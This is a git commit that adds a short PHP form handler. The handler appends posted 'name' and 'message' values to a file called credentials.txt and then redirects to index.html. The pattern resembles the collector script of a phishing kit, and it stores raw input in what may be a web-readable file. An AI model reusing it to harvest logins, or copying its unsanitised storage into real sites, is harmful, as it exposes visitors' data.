d17cf35d9de0aade3549860eaab7fb824717eb45
moustafashekh <159159673+moustafashekh@users.noreply.github.com>
2024-08-21 13:50:46 +0300

    Add files via upload

---
+++ image/submit.php
@@ -0,0 +1,18 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $name = isset($_POST['name']) ? $_POST['name'] : "Anonymous"; // Default name if not provided
+    $message = $_POST['message'];
+
+    // Prepare the data to be written
+    $data = "Name: " . $name . "\nMessage: " . $message . "\n\n";
+
+    // Write to credentials.txt
+    file_put_contents('credentials.txt', $data, FILE_APPEND | LOCK_EX);
+
+    // Redirect back to index.html with a query parameter
+    header("Location: index.html?submitted=true");
+    exit();
+} else {
+    echo "Invalid request.";
+}
+?>
